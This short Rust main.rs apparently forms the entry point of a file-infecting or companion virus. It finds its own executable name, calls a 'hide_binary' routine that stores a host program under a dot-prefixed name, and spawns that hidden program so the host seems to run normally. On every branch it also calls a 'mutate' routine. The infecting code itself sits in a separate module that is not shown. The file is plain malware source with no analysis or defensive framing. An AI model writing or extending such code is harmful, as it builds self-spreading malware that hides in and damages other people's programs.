mod modules;

fn main() {

    let exe = std::env::current_exe().expect("Failed to get the path")
                            .display().to_string()
                            .split("/")
                            .last().expect("Failed to slice the path")
                            .to_string();
    
    let binary_path = modules::get_path();
    if binary_path.is_empty() {
       
        modules::mutate();
        std::process::exit(0);
        
    } else if std::path::Path::new(&format!(".{}", exe)).exists() {
         
        std::process::Command::new(format!("./{}", binary_path)).spawn().expect("Failed to spawn the process");
        modules::mutate();
    
    } else {
        
        modules::hide_binary(binary_path, exe); 
        modules::mutate();

    }

}



